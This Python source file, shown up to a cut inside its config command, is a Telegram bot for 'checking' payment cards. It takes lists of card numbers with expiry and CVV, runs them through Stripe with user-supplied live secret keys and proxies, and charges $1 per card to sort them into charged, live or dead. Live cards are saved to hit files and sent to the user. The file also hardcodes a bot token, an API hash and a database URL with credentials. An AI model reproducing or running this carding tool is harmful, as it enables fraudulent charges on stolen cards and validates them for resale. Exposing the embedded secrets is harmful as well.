import os
import time
import random
import string
import json
import asyncio
import aiohttp
import threading
import requests
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Tuple, Any
from concurrent.futures import ThreadPoolExecutor
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.enums import ParseMode
import motor.motor_asyncio
import re
from io import BytesIO
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

BOT_TOKEN = "8251357457:AAHB1I8n8pJKhS8ILbTloghDJ7tpBINF02E"
API_ID = 23933044
API_HASH = "6df11147cbec7d62a323f0f498c8c03a"
OWNER_ID = 7125341830
MONGO_URL = "mongodb+srv://animepahe:animepahe@animepahe.o8zgy.mongodb.net/?retryWrites=true&w=majority"

client = motor.motor_asyncio.AsyncIOMotorClient(MONGO_URL)
db = client.stripe_checker
users_collection = db.users

app = Client(
    "stripe_checker_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    workers=200, 
    max_concurrent_transmissions = 1000, 
    sleep_threshold=15
)

HIT_FOLDER = "HIT"
if not os.path.exists(HIT_FOLDER):
    os.makedirs(HIT_FOLDER)

class StripeChecker:
    def __init__(self):
        self.active_checks = {}
        self.thread_executor = ThreadPoolExecutor(max_workers=8)
    
    def fetch_bin_details(self, first6: str) -> Dict:
        try:
            response = requests.get(f"https://bins.antipublic.cc/bins/{first6}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                return {
                    "brand": data.get("brand", "Unknown"),
                    "type": data.get("type", "Unknown"),
                    "level": data.get("level", "Unknown"),
                    "bank": data.get("bank", "Unknown"),
                    "country": data.get("country_name", "Unknown"),
                    "country_code": data.get("country", "Unknown"),
                    "flag": data.get("country_flag", "🌍"),
                    "currencies": data.get("country_currencies", []),
                    "valid": True
                }
            else:
                return {
                    "brand": "UNKNOWN",
                    "type": "UNKNOWN", 
                    "level": "UNKNOWN",
                    "bank": "UNKNOWN",
                    "country": "UNKNOWN",
                    "country_code": "UNKNOWN",
                    "flag": "🌍",
                    "currencies": [],
                    "valid": False
                }
        except Exception as e:
            return {
                "brand": "UNKNOWN",
                "type": "UNKNOWN",
                "level": "UNKNOWN", 
                "bank": "UNKNOWN",
                "country": "UNKNOWN",
                "country_code": "UNKNOWN",
                "flag": "🌍",
                "currencies": [],
                "valid": False
            }
    
    async def find_between(self, text: str, start: str, end: str) -> Optional[str]:
        try:
            pattern = re.escape(start) + '(.*?)' + re.escape(end)
            match = re.search(pattern, text, re.DOTALL)
            if match:
                return match.group(1)
        except:
            pass
        return None
        
    async def check_sk_live(self, sk_key: str) -> Tuple[bool, str]:
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    'Authorization': f'Bearer {sk_key}',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
                
                async with session.get(
                    'https://api.stripe.com/v1/balance',
                    headers=headers,
                    timeout=30
                ) as response:
                    result = await response.text()
                    
                    if response.status == 200:
                        try:
                            data = json.loads(result)
                            if 'object' in data and data['object'] == 'balance':
                                available = 0
                                if 'available' in data:
                                    for balance in data['available']:
                                        if balance['currency'] == 'usd':
                                            available += balance['amount'] / 100
                                
                                pending = 0
                                if 'pending' in data:
                                    for balance in data['pending']:
                                        if balance['currency'] == 'usd':
                                            pending += balance['amount'] / 100
                                
                                return True, f"✅ SK Live\n💰 Available: ${available:.2f}\n⏳ Pending: ${pending:.2f}"
                        except:
                            pass
                        return True, "✅ SK Live (Balance check failed)"
                    else:
                        error_msg = "Invalid SK Key"
                        try:
                            data = json.loads(result)
                            if 'error' in data and 'message' in data['error']:
                                error_msg = data['error']['message']
                        except:
                            pass
                        return False, f"❌ {error_msg}"
        except Exception as e:
            return False, f"❌ Error: {str(e)}"
    
    async def check_proxy(self, proxy_str: str) -> Tuple[bool, str]:
        try:
            if not proxy_str:
                return True, "✅ No proxy"
            
            if ':' in proxy_str:
                parts = proxy_str.split(':')
                if len(parts) == 2:
                    proxy_url = f'http://{proxy_str}'
                elif len(parts) == 4:
                    ip, port, user, password = parts
                    proxy_url = f'http://{user}:{password}@{ip}:{port}'
                else:
                    return False, "❌ Invalid proxy format"
                
                async with aiohttp.ClientSession() as session:
                    try:
                        async with session.get(
                            'https://api.stripe.com/v1/balance',
                            proxy=proxy_url,
                            timeout=10
                        ) as response:
                            if response.status:
                                return True, "✅ Proxy Working"
                    except:
                        return False, "❌ Proxy Not Working"
            
            return False, "❌ Invalid proxy format"
        except Exception as e:
            return False, f"❌ Error: {str(e)}"
    
    def parse_cc(self, cc_string: str) -> Tuple[str, str, str, str]:
        separators = ['|', ':', ';', ',', ' ']
        for sep in separators:
            if sep in cc_string:
                parts = cc_string.split(sep)
                if len(parts) >= 4:
                    cc = parts[0].strip()
                    mes = parts[1].strip()
                    ano = parts[2].strip()
                    cvv = parts[3].strip()
                    
                    if len(mes) == 1:
                        mes = f"0{mes}"
                    if len(ano) == 2:
                        ano = f"20{ano}"
                    
                    return cc, mes, ano, cvv
        
        return "", "", "", ""
    
    async def check_single_cc_threaded(self, cc_string: str, sk_key: str, pk_key: str, 
                                      amount: float = 1.0, proxy: Optional[str] = None,
                                      user_id: Optional[int] = None, unique_key: Optional[str] = None) -> Dict:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(
            self.thread_executor, 
            lambda: asyncio.run(self._check_single_cc_sync(cc_string, sk_key, pk_key, amount, proxy, user_id, unique_key))
        )
    
    async def _check_single_cc_sync(self, cc_string: str, sk_key: str, pk_key: str, 
                                   amount: float = 1.0, proxy: Optional[str] = None,
                                   user_id: Optional[int] = None, unique_key: Optional[str] = None) -> Dict:
        cc, mes, ano, cvv = self.parse_cc(cc_string)
        
        if not cc or not mes or not ano or not cvv:
            return {
                'cc': cc_string,
                'status': 'ERROR',
                'response': 'Invalid CC format',
                'result': 'ERROR'
            }
        
        for attempt in range(3):
            try:
                proxy_dict = None
                if proxy:
                    parts = proxy.split(':')
                    if len(parts) == 2:
                        proxy_dict = f'http://{proxy}'
                    elif len(parts) == 4:
                        ip, port, user, password = parts
                        proxy_dict = f'http://{user}:{password}@{ip}:{port}'
                
                guid = ''.join(random.choices(string.hexdigits, k=32)).lower()
                muid = ''.join(random.choices(string.hexdigits, k=32)).lower()
                sid = ''.join(random.choices(string.hexdigits, k=32)).lower()
                time_on_page = random.randint(10021, 10090)
                
                import aiohttp
                import asyncio as async_io
                
                async def check_cc():
                    async with aiohttp.ClientSession() as session:
                        payment_method_data = {
                            'type': 'card',
                            'card[number]': cc,
                            'card[exp_month]': mes,
                            'card[exp_year]': ano,
                            'card[cvc]': cvv,
                            'guid': guid,
                            'muid': muid,
                            'sid': sid,
                            'payment_user_agent': 'stripe.js/fb7ba4c633; stripe-js-v3/fb7ba4c633; split-card-element',
                            'time_on_page': time_on_page
                        }
                        
                        headers = {
                            'Authorization': f'Bearer {pk_key}',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        }
                        
                        async with session.post(
                            'https://api.stripe.com/v1/payment_methods',
                            data=payment_method_data,
                            headers=headers,
                            proxy=proxy_dict,
                            timeout=30
                        ) as response:
                            result1 = await response.text()
                            
                            if "rate_limit" in result1:
                                await async_io.sleep(2)
                                raise Exception("Rate limit, retrying")
                            
                            payment_method_created = False
                            tok1 = ""
                            
                            if response.status == 200:
                                try:
                                    data = json.loads(result1)
                                    if data.get('object') == 'payment_method':
                                        tok1 = data.get('id', '')
                                        payment_method_created = True
                                except:
                                    pass
                            
                            if not payment_method_created:
                                error_msg = "Payment Method Creation Failed"
                                try:
                                    data = json.loads(result1)
                                    if 'error' in data and 'message' in data['error']:
                                        error_msg = data['error']['message']
                                except:
                                    pass
                                
                                return {
                                    'cc': cc_string,
                                    'status': '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌',
                                    'response': error_msg,
                                    'result': 'DEAD'
                                }
                        
                        amount_cents = int(amount * 100)
                        payment_intent_data = {
                            'amount': amount_cents,
                            'currency': 'usd',
                            'payment_method_types[]': 'card',
                            'payment_method': tok1,
                            'confirm': 'true',
                            'off_session': 'true',
                            'description': 'Ghost Donation'
                        }
                        
                        headers['Authorization'] = f'Bearer {sk_key}'
                        
                        async with session.post(
                            'https://api.stripe.com/v1/payment_intents',
                            data=payment_intent_data,
                            headers=headers,
                            proxy=proxy_dict,
                            timeout=30
                        ) as response:
                            result2 = await response.text()
                            
                            if "rate_limit" in result2:
                                await async_io.sleep(2)
                                raise Exception("Rate limit, retrying")
                            
                            receipt_url = ""
                            try:
                                data = json.loads(result2)
                                receipt_url = data.get('receipt_url', '')
                            except:
                                pass
                            
                            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                            response_msg = "Card Declined"
                            hits = "NO"
                            match_key = ""
                            
                            result_lower = result2.lower()
                            
                            if (
                                "succeeded" in result_lower
                                or "thank you" in result_lower
                                or "thank you!" in result_lower
                                or "thank you for your order" in result_lower
                                or "success:true" in result_lower
                                or '"status": "succeeded"' in result2
                            ):
                                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                                response_msg = f"Charged {amount}$ 🔥"
                                hits = "CHARGED"
                                match_key = "succeeded"
                            
                            elif "insufficient_funds" in result2 or "card has insufficient funds." in result2:
                                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                                response_msg = "Insufficient Funds ❎"
                                hits = "LIVE"
                                match_key = "insufficient_funds"
                            
                            elif (
                                "incorrect_cvc" in result2
                                or "security code is incorrect." in result2
                                or "Your card's security code is incorrect." in result2
                            ):
                                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                                response_msg = "CCN Live ❎"
                                hits = "LIVE"
                                match_key = "Your card's security code is incorrect."
                            
                            elif "transaction_not_allowed" in result2:
                                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                                response_msg = "Card Doesn't Support Purchase ❎"
                                hits = "LIVE"
                                match_key = "transaction_not_allowed"
                            
                            elif '"cvc_check": "pass"' in result2:
                                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                                response_msg = "CVV LIVE ❎"
                                hits = "LIVE"
                                match_key = "cvc_check"
                            
                            elif (
                                "three_d_secure_redirect" in result2
                                or "card_error_authentication_required" in result2
                            ):
                                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                                response_msg = "3D Challenge Required ❎"
                                hits = "LIVE"
                                match_key = "three_d_secure_redirect"
                            
                            elif "stripe_3ds2_fingerprint" in result2:
                                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                                response_msg = "3D Challenge Required ❎"
                                hits = "LIVE"
                                match_key = "stripe_3ds2_fingerprint"
                            
                            elif "Your card does not support this type of purchase." in result2:
                                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                                response_msg = "Card Doesn't Support Purchase ❎"
                                hits = "LIVE"
                                match_key = "Your card does not support this type of purchase."
                            
                            elif (
                                "generic_decline" in result2
                                or "You have exceeded the maximum number of declines on this card in the last 24 hour period."
                                in result2
                                or "card_decline_rate_limit_exceeded" in result2
                            ):
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "Generic Decline"
                                hits = "NO"
                                match_key = "DECLINE"
                            
                            elif "do_not_honor" in result2:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "Do Not Honor"
                                hits = "NO"
                                match_key = "DNH"
                            
                            elif "fraudulent" in result2:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "Fraudulent"
                                hits = "NO"
                                match_key = "FRAUD"
                            
                            elif "setup_intent_authentication_failure" in result2:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "setup_intent_authentication_failure"
                                hits = "NO"
                                match_key = "AUTH"
                            
                            elif "invalid_cvc" in result2:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "invalid_cvc"
                                hits = "NO"
                                match_key = "CVC"
                            
                            elif "stolen_card" in result2:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "Stolen Card"
                                hits = "NO"
                                match_key = "STOLEN"
                            
                            elif "lost_card" in result2:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "Lost Card"
                                hits = "NO"
                                match_key = "LOST"
                            
                            elif "pickup_card" in result2:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "Pickup Card"
                                hits = "NO"
                                match_key = "PICKUP"
                            
                            elif "incorrect_number" in result2:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "Incorrect Card Number"
                                hits = "NO"
                                match_key = "NUM"
                            
                            elif "Your card has expired." in result2 or "expired_card" in result2:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "Expired Card"
                                hits = "NO"
                                match_key = "EXP"
                            
                            elif "intent_confirmation_challenge" in result2:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "intent_confirmation_challenge"
                                hits = "NO"
                                match_key = "CHALLENGE"
                            
                            elif "Your card number is incorrect." in result2:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "Incorrect Card Number"
                                hits = "NO"
                                match_key = "NUM"
                            
                            elif "This account isn't enabled to make cross border transactions" in result2:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "Cross Border Transaction Not Allowed"
                                hits = "NO"
                                match_key = "BORDER"
                            
                            elif (
                                "Your card's expiration year is invalid." in result2
                                or "Your card's expiration year is invalid." in result2
                            ):
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "Expiration Year Invalid"
                                hits = "NO"
                                match_key = "YEAR"
                            
                            elif (
                                "Your card's expiration month is invalid." in result2
                                or "invalid_expiry_month" in result2
                            ):
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "Expiration Month Invalid"
                                hits = "NO"
                                match_key = "MONTH"
                            
                            elif "card is not supported." in result2:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "Card Not Supported"
                                hits = "NO"
                                match_key = "UNSUPPORTED"
                            
                            elif "invalid_account" in result2:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "Dead Card"
                                hits = "NO"
                                match_key = "DEAD"
                            
                            elif (
                                "Invalid API Key provided" in result2
                                or "testmode_charges_only" in result2
                                or "api_key_expired" in result2
                                or "Your account cannot currently make live charges." in result2
                            ):
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "stripe error . contact support@stripe.com for more details"
                                hits = "NO"
                                match_key = "API"
                            
                            elif "Your card was declined." in result2 or "card was declined" in result2:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                response_msg = "Generic Decline"
                                hits = "NO"
                                match_key = "DECLINE"
                            
                            else:
                                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                                error_text = await self.find_between(result2, 'message": "', '"')
                                if error_text is None:
                                    error_text = "Card Declined"
                                response_msg = error_text
                                hits = "NO"
                                match_key = "ERROR"
                            
                            if hits == "CHARGED":
                                result_category = "CHARGED"
                            elif hits == "LIVE":
                                result_category = "LIVE"
                            else:
                                result_category = "DEAD"
                            
                            bin_details = self.fetch_bin_details(cc[:6])
                            
                            result_data = {
                                'cc': cc_string,
                                'status': status,
                                'response': response_msg,
                                'match_key': match_key,
                                'result': result_category,
                                'receipt_url': receipt_url,
                                'bin_details': bin_details,
                                'checked_at': datetime.utcnow().isoformat(),
                                'user_id': user_id,
                                'unique_key': unique_key
                            }
                            
                            return result_data
                
                return await check_cc()
                        
            except Exception as e:
                if attempt < 2:
                    await asyncio.sleep(1)
                    continue
                else:
                    return {
                        'cc': cc_string,
                        'status': 'ERROR',
                        'response': f'Error: {str(e)}',
                        'match_key': 'ERROR',
                        'result': 'ERROR',
                        'bin_details': self.fetch_bin_details(cc_string[:6] if cc_string[:6].isdigit() else '')
                    }
        
        return {
            'cc': cc_string,
            'status': 'ERROR',
            'response': 'Max retries exceeded',
            'match_key': 'ERROR',
            'result': 'ERROR',
            'bin_details': self.fetch_bin_details(cc_string[:6] if cc_string[:6].isdigit() else '')
        }
    
    async def save_hit_file(self, unique_key: str, results: Dict):
        try:
            total_live_cards = len(results['CHARGED']) + len(results['LIVE'])
            

            if total_live_cards == 0:
                return None, None, None
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            

            hit_filename = f"{unique_key}_{timestamp}_hits.txt"
            hit_filepath = os.path.join(HIT_FOLDER, hit_filename)
            
            content = f"""STRIPE CHECKER HITS - {unique_key}
================================
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Gateway: SK BASED $1.00 CVV
Total Cards: {sum(len(v) for v in results.values())}
Charged: {len(results['CHARGED'])}
Live: {len(results['LIVE'])}
Dead: {len(results['DEAD'])}
================================

✅ CHARGED CARDS ({len(results['CHARGED'])}):
================================
"""
            
            for card in results['CHARGED']:
                bin_info = card.get('bin_details', {})
                content += f"\n{card['cc']}\n"
                content += f"Response: {card['response']} [{card.get('match_key', 'N/A')}]\n"
                if card.get('receipt_url'):
                    content += f"Receipt: {card['receipt_url']}\n"
                content += f"BIN: {card['cc'][:6]} | {bin_info.get('flag', '🌍')} {bin_info.get('country', 'UNKNOWN')}\n"
                content += f"Bank: {bin_info.get('bank', 'UNKNOWN')} | Type: {bin_info.get('type', 'UNKNOWN')}\n"
                content += "-" * 40 + "\n"
            
            content += f"\n\n⚡ LIVE CARDS ({len(results['LIVE'])}):\n"
            content += "================================\n"
            
            for card in results['LIVE']:
                bin_info = card.get('bin_details', {})
                content += f"\n{card['cc']}\n"
                content += f"Response: {card['response']} [{card.get('match_key', 'N/A')}]\n"
                content += f"BIN: {card['cc'][:6]} | {bin_info.get('flag', '🌍')} {bin_info.get('country', 'UNKNOWN')}\n"
                content += f"Bank: {bin_info.get('bank', 'UNKNOWN')} | Type: {bin_info.get('type', 'UNKNOWN')}\n"
                content += "-" * 40 + "\n"
            
            with open(hit_filepath, 'w', encoding='utf-8') as f:
                f.write(content)
            

            cc_filename = f"{unique_key}_{timestamp}_cc.txt"
            cc_filepath = os.path.join(HIT_FOLDER, cc_filename)
            
            cc_content = ""
            for card in results['CHARGED']:
                cc_content += f"{card['cc']}\n"
            
            for card in results['LIVE']:
                cc_content += f"{card['cc']}\n"
            
            with open(cc_filepath, 'w', encoding='utf-8') as f:
                f.write(cc_content)
            

            json_filename = f"{unique_key}_{timestamp}.json"
            json_filepath = os.path.join(HIT_FOLDER, json_filename)
            
            with open(json_filepath, 'w', encoding='utf-8') as f:
                json.dump({
                    'unique_key': unique_key,
                    'created_at': datetime.now().isoformat(),
                    'results': results
                }, f, indent=2)
            
            logger.info(f"Saved files for {unique_key}: hits={total_live_cards}")
            
            return hit_filename, cc_filename, json_filename
            
        except Exception as e:
            logger.error(f"Error saving hit file: {e}")
            return None, None, None
    
    async def get_hit_file(self, unique_key: str):
        try:
            files = []
            for filename in os.listdir(HIT_FOLDER):
                if filename.startswith(unique_key + "_") and filename.endswith("_hits.txt"):
                    files.append(filename)
            
            if not files:
                return None
            
            latest_file = max(files)
            filepath = os.path.join(HIT_FOLDER, latest_file)
            
            file_time = datetime.fromtimestamp(os.path.getmtime(filepath))
            if datetime.now() - file_time > timedelta(hours=7):
                return None
            
            return filepath
            
        except Exception as e:
            logger.error(f"Error getting hit file: {e}")
            return None
    
    async def get_cc_file(self, unique_key: str):
        try:
            files = []
            for filename in os.listdir(HIT_FOLDER):
                if filename.startswith(unique_key + "_") and filename.endswith("_cc.txt"):
                    files.append(filename)
            
            if not files:
                return None
            
            latest_file = max(files)
            filepath = os.path.join(HIT_FOLDER, latest_file)
            
            file_time = datetime.fromtimestamp(os.path.getmtime(filepath))
            if datetime.now() - file_time > timedelta(hours=7):
                return None
            
            return filepath
            
        except Exception as e:
            logger.error(f"Error getting cc file: {e}")
            return None
    
    async def send_live_card_notification(self, card_data: Dict, user_id: int, check_time: float):
        try:
            bin_info = card_data.get('bin_details', {})
            flag = bin_info.get('flag', '🌍')
            brand = bin_info.get('brand', 'UNKNOWN')
            bank = bin_info.get('bank', 'UNKNOWN')
            country = bin_info.get('country', 'UNKNOWN')
            card_type = bin_info.get('type', 'UNKNOWN')
            
            hours = int(check_time // 3600)
            minutes = int((check_time % 3600) // 60)
            seconds = int(check_time % 60)
            time_taken = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
            
            message = f"""
💳 **{card_data['result']} CARD FOUND!**

**Card:** `{card_data['cc']}`
**Status:** {card_data['status']}
**Response:** {card_data['response']} [{card_data.get('match_key', 'N/A')}]
**Amount:** ${1.00:.2f}
**Time Taken:** {time_taken}

**BIN Information:**
{flag} **Country:** {country}
💳 **Brand:** {brand}
🏦 **Bank:** {bank}
🃏 **Type:** {card_type}

**CHK BY** @still_alivenow
            """
            
            await app.send_message(
                chat_id=user_id,
                text=message,
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            logger.error(f"Error sending live card notification: {e}")

checker = StripeChecker()

async def get_user_data(user_id: int) -> Dict:
    user = await users_collection.find_one({'user_id': user_id})
    if not user:
        user = {
            'user_id': user_id,
            'sk_key': None,
            'pk_key': None,
            'proxy': None,
            'amount': 1.0,
            'created_at': datetime.utcnow()
        }
        await users_collection.insert_one(user)
    return user

async def update_user_data(user_id: int, update_data: Dict):
    await users_collection.update_one(
        {'user_id': user_id},
        {'$set': update_data}
    )

def generate_unique_key() -> str:
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"GENZ-SKBASED-{random_part}"

async def cleanup_old_files():
    while True:
        try:
            cutoff_time = datetime.now() - timedelta(hours=7)
            deleted_count = 0
            
            for filename in os.listdir(HIT_FOLDER):
                filepath = os.path.join(HIT_FOLDER, filename)
                if os.path.isfile(filepath):
                    file_time = datetime.fromtimestamp(os.path.getmtime(filepath))
                    if file_time < cutoff_time:
                        os.remove(filepath)
                        deleted_count += 1
            
            if deleted_count > 0:
                logger.info(f"Cleaned up {deleted_count} old files")
            
            await asyncio.sleep(3600)
            
        except Exception as e:
            logger.error(f"Error in cleanup: {e}")
            await asyncio.sleep(300)

async def process_batch_ccs(cc_list: List[str], user: Dict, user_id: int, 
                           unique_key: str, status_msg: Message):
    results = {
        'CHARGED': [],
        'LIVE': [],
        'DEAD': [],
        'ERROR': []
    }
    
    start_time = time.time()
    total_cc = len(cc_list)
    
    checker.active_checks[unique_key] = {
        'user_id': user_id,
        'running': True,
        'status_msg_id': status_msg.id,
        'start_time': start_time,
        'total_cc': total_cc,
        'results': results
    }
    
    batch_size = 8
    update_interval = 50
    
    for i in range(0, total_cc, batch_size):
        if not checker.active_checks.get(unique_key, {}).get('running', True):
            break
        
        batch = cc_list[i:i + batch_size]
        
        tasks = []
        for cc_string in batch:
            task = checker.check_single_cc_threaded(
                cc_string,
                user['sk_key'],
                user['pk_key'],
                user['amount'],
                user['proxy'],
                user_id,
                unique_key
            )
            tasks.append(task)
        
        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in batch_results:
            if isinstance(result, Exception):
                error_result = {
                    'cc': 'UNKNOWN',
                    'status': 'ERROR',
                    'response': str(result),
                    'match_key': 'ERROR',
                    'result': 'ERROR',
                    'bin_details': {'valid': False}
                }
                results['ERROR'].append(error_result)
            else:
                results[result['result']].append(result)
                
                if result['result'] in ['CHARGED', 'LIVE']:
                    check_time = time.time() - start_time
                    await checker.send_live_card_notification(result, user_id, check_time)
        
        processed = i + len(batch)
        
        if processed % update_interval == 0 or processed == total_cc:
            elapsed = time.time() - start_time
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            seconds = int(elapsed % 60)
            
            status_text = f"""
**Stripe Checker ⚡**

• **Gateway** - SK BASED ${user['amount']:.2f} CVV ♻️
• **Total CC Input** - {total_cc}
• **Charged** - {len(results['CHARGED'])}
• **Live** - {len(results['LIVE'])}
• **Dead** - {len(results['DEAD'])}
• **Total Checked** - {processed}/{total_cc}
• **Secret Key** - {user['sk_key'][:10]}...
• **Threads** - 8 ⚡
• **Status** - Checking... ⏳

• **Time** - {hours}h {minutes}m {seconds}s
            """
            
            stop_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🛑 STOP", callback_data=f"stop_check_{unique_key}")]
            ])
            
            try:
                await status_msg.edit_text(status_text, reply_markup=stop_keyboard, parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                logger.error(f"Error updating status: {e}")
    
    if unique_key in checker.active_checks:
        del checker.active_checks[unique_key]
    
    return results

@app.on_message(filters.command("start") & filters.private)
async def start_command(client, message):
    user_id = message.from_user.id
    user = await get_user_data(user_id)
    
    welcome_text = f"""
👋 **Welcome to SKBASED CC Checker Bot!**

**Available Commands:**

🔧 **Configuration:**
/setsk - Set Stripe Secret Key
/setpk - Set Stripe Publishable Key
/setproxy - Set Proxy (Optional but Recommended)
/setamount - Set Charge Amount
/myconfig - Show Current Configuration

💳 **Checking:**
/single - Check Single CC (with BIN info)
/multi - Check Multiple CCs (max 20) - 8 Threads ⚡
/txt - Check CCs from TXT file (max 3000) - 8 Threads ⚡
/stop - Stop Current Check

📊 **Results:**
/gethit GENZ-SKBASED-XXXXXXX - Get Results by Key
/getcc GENZ-SKBASED-XXXXXXX - Get CC List Only
/getlive GENZ-SKBASED-XXXXXXX - Get Only LIVE/CHARGED Cards
/deleteconfig - Delete All Configuration

**Status:** {'✅ Configuration Complete' if user['sk_key'] and user['pk_key'] else '❌ Please set SK and PK first'}

**Owner:** @still_alivenow
    """
    
    await message.reply_text(welcome_text, parse_mode=ParseMode.MARKDOWN)

@app.on_message(filters.command("setsk") & filters.private)
async def set_sk_command(client, message):
    user_id = message.from_user.id
    
    if len(message.command) < 2:
        await message.reply_text("❌ Please provide SK key\nUsage: `/setsk sk_live_...`", parse_mode=ParseMode.MARKDOWN)
        return
    
    sk_key = message.command[1]
    
    if not sk_key.startswith('sk_live_'):
        await message.reply_text("❌ Invalid SK key format. Must start with 'sk_live_'")
        return
    
    checking_msg = await message.reply_text("🔍 Checking SK key...")
    is_live, status_msg = await checker.check_sk_live(sk_key)
    
    if is_live:
        await update_user_data(user_id, {'sk_key': sk_key})
        await checking_msg.edit_text(f"✅ SK Key Set Successfully!\n\n{status_msg}")
    else:
        await checking_msg.edit_text(f"❌ Failed to set SK key\n\n{status_msg}")

@app.on_message(filters.command("setpk") & filters.private)
async def set_pk_command(client, message):
    user_id = message.from_user.id
    user = await get_user_data(user_id)
    
    if not user['sk_key']:
        await message.reply_text("❌ Please set SK key first using /setsk")
        return
    
    if len(message.command) < 2:
        await message.reply_text("❌ Please provide PK key\nUsage: `/setpk pk_live_...`", parse_mode=ParseMode.MARKDOWN)
        return
    
    pk_key = message.command[1]
    
    if not pk_key.startswith('pk_live_'):
        await message.reply_text("❌ Invalid PK key format. Must start with 'pk_live_'")
        return
    
    await update_user_data(user_id, {'pk_key': pk_key})
    await message.reply_text("✅ PK Key Set Successfully!")

@app.on_message(filters.command("setproxy") & filters.private)
async def set_proxy_command(client, message):
    user_id = message.from_user.id
    
    if len(message.command) < 2:
        await message.reply_text("❌ Please provide proxy\nUsage: `/setproxy ip:port` or `/setproxy ip:port:user:pass`", parse_mode=ParseMode.MARKDOWN)
        return
    
    proxy_str = message.command[1]
    
    if ':' not in proxy_str:
        await message.reply_text("❌ Invalid proxy format")
        return
    
    checking_msg = await message.reply_text("🔍 Checking proxy...")
    is_working, status_msg = await checker.check_proxy(proxy_str)
    
    if is_working:
        await update_user_data(user_id, {'proxy': proxy_str})
        await checking_msg.edit_text(f"✅ Proxy Set Successfully!\n\n{status_msg}")
    else:
        await checking_msg.edit_text(f"❌ Failed to set proxy\n\n{status_msg}")

@app.on_message(filters.command("setamount") & filters.private)
async def set_amount_command(client, message):
    user_id = message.from_user.id
    
    if len(message.command) < 2:
        await message.reply_text("❌ Please provide amount\nUsage: `/setamount 1.0`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        amount = float(message.command[1])
        if amount <= 0 or amount > 1000:
            await message.reply_text("❌ Amount must be between $0.01 and $1000")
            return
        
        await update_user_data(user_id, {'amount': amount})
        await message.reply_text(f"✅ Amount set to ${amount:.2f}")
    except ValueError:
        await message.reply_text("❌ Invalid amount. Please enter a number")

@app.on_message(filters.command("myconfig") & filters.private)
async def my_config_command(client, message):
    user_id = message.from_user.id
    user = await get_user_data(user_id)
    
    sk_display = f"`{user['sk_key']}...`" if user['sk_key'] else '❌ Not Set'
    pk_display = f"`{user['pk_key']}...`" if user['pk_key'] else '❌ Not Set'
    proxy_display = f"`{user['proxy']}`" if user['proxy'] else '❌ Not Set'
    
    config_text = f"""
🔧 **Your Configuration:**

**Secret Key:** {sk_display}
**Public Key:** {pk_display}
**Proxy:** {proxy_display}
